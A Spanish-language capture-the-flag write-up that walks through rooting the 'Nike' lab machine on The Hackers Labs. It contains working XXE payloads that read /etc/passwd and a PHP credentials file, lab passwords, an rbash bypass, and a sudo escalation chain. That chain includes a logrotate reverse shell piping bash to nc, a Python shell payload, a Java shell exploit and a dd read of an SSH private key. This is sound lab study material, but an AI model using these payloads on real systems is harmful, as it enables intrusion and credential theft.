# Write-Up: Nike - The Hackers Labs

## Información General

- **Nombre de la máquina**: Nike
- **Plataforma**: The Hackers Labs
- **Dificultad**: Avanzado
- **Creador**: wvverez_
- **Sistema Operativo**: Linux
- **Objetivos**: Obtención de la Flag de usuario y de root
- **Fecha de resolución**: 10 de Julio de 2026

---

## FASE 1: ENUMERACIÓN

### Descubrimiento de Puertos

```bash
nmap -sV -p- 192.168.231.160
```

**Resultado:**

| Puerto | Estado | Servicio | Versión |
|--------|--------|----------|---------|
| 22/tcp | Open | SSH | OpenSSH 9.2p1 Debian 2+deb12u3 |
| 80/tcp | HTTP | Apache | Apache/2.4.62 (Debian) |
| MAC | - | VMware | 00:0C:29:29:F7:7E |

**Análisis:**
- Puerto 22: SSH con OpenSSH 9.2p1 — posibles vulnerabilidades
- Puerto 80: Servidor web Apache — "Tienda Nike - Zapatillas"

---

### Enumeración Web

Al acceder a `http://192.168.231.160` se muestra una tienda de zapatillas Nike.

**Archivos encontrados:**
- `upload.php` — Endpoint de procesamiento XML
- `datos.php` — Archivo con credenciales (descubierto después)

---

## FASE 2: EXPOSICIÓN

### Intento 1: Fuerza Bruta SSH con Hydra (FALLIDO)

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.231.160
```

**Resultado:**
```
[ERROR] could not connect to ssh://192.168.231.160:22 - Connection refused
```

**Análisis:**
- Aunque nmap mostraba el puerto 22 abierto, Hydra no podía conectarse
- Posible firewall que bloquea conexiones masivas
- Se descartó esta vía

---

### Intento 2: XXE en upload.php (EXITOSO)

Se descubrió que `upload.php` procesa XML con las flags:
```php
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
```

Esto permite **XML External Entity (XXE)** injection.

**Payload para leer archivos:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
 <name>&xxe;</name>
</root>
```

**Resultado:**
Se obtuvo el contenido de `/etc/passwd` con los usuarios del sistema:
- `mike` (uid 1000) — `/bin/rbash` (restricted bash)
- `n` (uid 1001) — `/bin/bash`
- `pylon` (uid 1002) — `/bin/bash`
- `macci` (uid 1003) — `/bin/bash`
- `wvverez` (uid 1004) — `/bin/bash`

---

### Intento 3: Leer /etc/shadow con XXE (FALLIDO)

```xml
<!ENTITY xxe SYSTEM "file:///etc/shadow">
```

**Resultado:**
```
Warning: DOMDocument::loadXML(/etc/shadow): Failed to open stream: Permission denied
```

**Análisis:**
- El servidor web (`www-data`) no tiene permisos para leer `/etc/shadow`
- Se descartó esta vía para crackeo de contraseñas

---

### Intento 4: PHP expect wrapper (FALLIDO)

```xml
<!ENTITY xxe SYSTEM "expect://whoami">
```

**Resultado:**
```
Warning: Unable to find the wrapper "expect" - did you forget to enable it when you configured PHP?
```

**Análisis:**
- El wrapper `expect` no está habilitado en el PHP del servidor
- Se descartó esta vía para ejecución de comandos

---

### Intento 5: php://filter para leer configuración (EXITOSO)

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/datos.php">
```

**Resultado (decodificado):**
```php
<?php
$user = "mike";
$pass = "oK)Lpk3#mmK!#p";
$dni_user = "74239813V";
$num_user = "+34 678 912 395";

$user = "wvverez";
$pass = "jKolpmd2f0dmko07x!@kk%";
$dni_user = "679145983X";
$num_user = "+ 34 922 178 452"

$user = "pylon";
$pass = "rp&swp)lkfg23lio";
$dni_user = "632159321M";
$num_user = "+ 34 611 459 112";

$user = "macci";
$pass = "koplsdm$%#jokk*mloker";
$dni_user = "547891239U";
$num_user = "+ 34 678 125 226";

$user = "n";
$pass = "kjlso%#mssa*nmccasca$%";
$dni_user = "432986104B";
$num_user = "+34 911 763 689";

if ($_SERVER['REQUEST_METHOD'] !== 'CLI') {
 http_response_code(403);
 die("Access Denied.");
}
?>
```

**Descubrimiento:**
- Credenciales de 5 usuarios en texto plano
- Cada usuario tiene: usuario, contraseña, DNI y teléfono
- Las credenciales pueden servir para SSH

---

## FASE 3: ACCESO INICIAL

### SSH como Mike (bypass de rbash)

```bash
ssh mike@192.168.231.160
```

**Contraseña:** `oK)Lpk3#mmK!#p`

**Problema:**
- Mike tiene `rbash` (restricted bash)
- No se puede cambiar de directorio, exportar variables, ni usar redirecciones

**Solución:**
Agregar `bash` al final del comando SSH para evitar rbash:
```bash
ssh mike@192.168.231.160 bash
```

**Resultado:**
```
mike@TheHackersLabs-Nike:~$ whoami
mike
```

---

## FASE 4: ESCALADA DE PRIVILEGIOS

### Cadena de escalada completa

```
mike → n → pylon → macci → wvverez → root
```

---

### Paso 1: mike → n (Java con sudo)

**Verificación:**
```bash
sudo -l
```

**Resultado:**
```
User mike may run the following commands on TheHackersLabs-Nike:
 (n) NOPASSWD: /usr/bin/java
```

**Método:**
Crear un exploit Java que ejecute una bash:

**Exploit.java (en el Kali atacante):**
```java
public class Exploit {
 public static void main(String[] args) {
 try {
 Process p = new ProcessBuilder("/bin/bash").inheritIO().start();
 p.waitFor();
 } catch (Exception e) {
 e.printStackTrace();
 }
 }
}
```

**Compilar y subir:**
```bash
# En Kali
javac Exploit.java
python3 -m http.server 80

# En la víctima
wget http://192.168.231.150/Exploit.java -O /tmp/Exploit.java
javac /tmp/Exploit.java
sudo -u n java -cp /tmp Exploit
```

**Resultado:**
```
mike@TheHackersLabs-Nike:~$ whoami
n
```

---

### Paso 2: n → pylon (Python + script en /opt)

**Verificación:**
```bash
sudo -l
```

**Resultado:**
```
User n may run the following commands on TheHackersLabs-Nike:
 (pylon) NOPASSWD: /usr/bin/python3
```

**Descubrimiento:**
Revisando el script `/opt/suma.py`:
```bash
cat /opt/suma.py
```

**Contenido original:**
```python
import sys

# definiendo la función
def suma(a, b):
 return a + b

def cuadrado(a):
 return a * a

# Entrada de los valores por pantalla
a = int(input("Introduce el primer numero: "))
b = int(input("Introduce el segundo número: "))

# impresión del resultado de la función suma
print("La suma de " + str(a) + " + " + str(b) + " es " + str(suma(a, b)))

# impresión del resultado de la función cuadrado
print("El cuadrado de " + str(a) + " es " + str(cuadrado(a)))
```

**Método:**
Sobrescribir el script con un payload para lanzar una shell:
```bash
echo 'import os; os.system("/bin/sh")' > /opt/suma.py
```

Ejecutar el script como pylon:
```bash
sudo -u pylon /usr/bin/python3 /opt/suma.py
```

**Resultado:**
```
n@TheHackersLabs-Nike:~$ whoami
pylon
```

---

### Paso 3: pylon → macci (logrotate reverse shell)

**Verificación:**
```bash
sudo -l
```

**Resultado:**
```
User pylon may run the following commands on TheHackersLabs-Nike:
 (macci) NOPASSWD: /usr/sbin/logrotate
```

**Método:**
Explotar logrotate con una reverse shell a través de `firstaction`.

**Archivos creados:**
```bash
# Archivo de log aleatorio
head -c 2000 /dev/urandom > /tmp/test.log

# Archivo de estado
touch /tmp/status

# Config de logrotate
cat << 'EOF' > /tmp/exploit.conf
/tmp/test.log {
 daily
 size 1k
 firstaction
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.231.150 443 > /tmp/f &
 endscript
}
EOF

# Permisos para que macci pueda acceder
chmod 777 /tmp/test.log /tmp/status /tmp/exploit.conf
```

**En Kali (listener):**
```bash
nc -nlvp 443
```

**Ejecución:**
```bash
sudo -u macci logrotate -s /tmp/status /tmp/exploit.conf
```

**Resultado:**
```
macci@TheHackersLabs-Nike:/tmp$ whoami
macci
```

---

### Paso 4: macci → wvverez (dd para leer SSH key)

**Verificación:**
```bash
sudo -l
```

**Resultado:**
```
User macci may run the following commands on TheHackersLabs-Nike:
 (wvverez) NOPASSWD: /usr/bin/dd
```

**Método:**
Leer la clave SSH privada de wvverez con `dd`:
```bash
sudo -u wvverez dd if=/home/wvverez/.ssh/id_rsa
```

**Conexión SSH:**
```bash
# Guardar la clave en id_rsa
chmod 600 id_rsa
ssh -i id_rsa wvverez@192.168.231.160
```

**Resultado:**
```
wvverez@TheHackersLabs-Nike:~$ whoami
wvverez
```

---

### Paso 5: wvverez → root (SUID sys_monitor)

**Verificación:**
```bash
id
```

**Resultado:**
```
uid=1004(wvverez) gid=1004(wvverez) groups=1004(wvverez),100(users),1005(ctf_admins)
```

**Búsqueda de SUID:**
```bash
find / -perm -u=s 2>/dev/null
```

**Resultado:**
```
/usr/local/bin/sys_monitor
```

**Método:**
El binario `sys_monitor` tiene permisos SUID y pertenece al grupo `ctf_admins`.

Ejecutar con la opción 3:
```bash
/usr/local/bin/sys_monitor 3 /bin/bash
```

**Resultado:**
```
wvverez@TheHackersLabs-Nike:~$ whoami
root
```

---

## FASE 5: FLAGS

### User Flag
```bash
head flag.txt
```

### Root Flag

```bash
cat /root/root.txt
```

---

## HERRAMIENTAS UTILIZADAS

| Herramienta | Propósito |
|-------------|-----------|
| Nmap | Escaneo de puertos y servicios |
| Hydra | Fuerza bruta SSH (fallido) |
| XXE (XML External Entity) | Lectura de archivos |
| cURL | Envío de payloads XXE |
| Python HTTP Server | Transferencia de archivos |
| Netcat | Reverse shell |
| SSH | Acceso remoto |
| javac/java | Compilación y ejecución de exploit |

---

## LECCIONES APRENDIDAS

1. **XXE es poderoso**: Permite leer archivos del servidor si el parser XML no está configurado correctamente
2. **rbash no es infalible**: Se puede evitar agregando `bash` al final del comando SSH
3. **Sudoers con programas inofensivos**: `dd`, `java`, `python3`, `logrotate` pueden ser explotados para escalar privilegios
4. **Cadenas de escalada**: En CTFs avanzados, necesitás múltiples pasos para llegar a root
5. **SIEMPRE verificar sudo -l**: Cada usuario puede tener diferentes privilegios

---

## REFERENCIAS

- [GTFOBins](https://gtfobins.github.io/)
- [The Hackers Labs](https://labs.thehackerslabs.com/)

---

*Write-up creado el 10 de Julio de 2026* bueno ya son las 00:40 así que el 11 de julio también
